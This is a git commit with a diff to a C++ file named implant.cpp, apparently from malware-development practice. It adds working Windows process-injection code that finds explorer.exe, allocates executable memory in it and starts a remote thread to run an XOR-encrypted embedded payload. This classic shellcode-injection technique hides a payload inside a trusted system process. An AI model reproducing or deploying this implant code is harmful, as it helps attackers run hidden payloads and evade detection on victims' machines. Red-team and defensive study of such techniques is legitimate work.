65716396a3a93384b90871df03cd37e66734b68a
James Fraser <wulfgar.pro@gmail.com>
2023-11-07 06:10:14 +1100

    Inject payload into explorer.exe

--- implant.cpp
+++ implant.cpp
@@ -10,7 +10,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <tlhelp32.h>
+
 #include "resource.h"
+
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
     int j;
 
@@ -23,6 +26,51 @@ void XOR(char* data, size_t data_len, char* key, size_t key_len) {
     }
 }
 
+int FindTarget(const char* procname) {
+
+    HANDLE hProcSnap;
+    PROCESSENTRY32 pe32;
+    int pid = 0;
+
+    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hProcSnap, &pe32)) {
+        CloseHandle(hProcSnap);
+        return 0;
+    }
+
+    while (Process32Next(hProcSnap, &pe32)) {
+        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+            pid = pe32.th32ProcessID;
+            break;
+        }
+    }
+
+    CloseHandle(hProcSnap);
+
+    return pid;
+}
+
+int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len) {
+
+    LPVOID pRemoteCode = NULL;
+    HANDLE hThread = NULL;
+
+    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+    WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);
+
+    hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, 500);
+        CloseHandle(hThread);
+        return 0;
+    }
+    return -1;
+}
+
 int main(void) {
     void * exec_mem;
     BOOL rv;
@@ -30,6 +78,8 @@ int main(void) {
     DWORD oldProtect = 0;
     HGLOBAL resHandle = NULL;
     HRSRC res;
+    int pid = 0;
+    HANDLE hProc = NULL;
     
     unsigned char* payload;
     unsigned int payload_len;
@@ -52,16 +102,24 @@ int main(void) {
     // Decrypt (DeXOR) the payload
     XOR((char*)exec_mem, payload_len, key, sizeof(key));
 
-    // Make the buffer executable
-    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);
-
     printf("\nHit me!\n");
     getchar();
 
-    // Launch the payload
-    if ( rv != 0 ) {
-        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
-        WaitForSingleObject(th, -1);
+    // Inject payload into `notepad.exe` process.
+    pid = FindTarget("explorer.exe");
+
+    if (pid) {
+        printf("explorer.exe PID = %d\n", pid);
+
+        // Try to open target process
+        hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
+            FALSE, (DWORD)pid);
+
+        if (hProc != NULL) {
+            Inject(hProc, exec_mem, payload_len);
+            CloseHandle(hProc);
+        }
     }
 
     return 0;
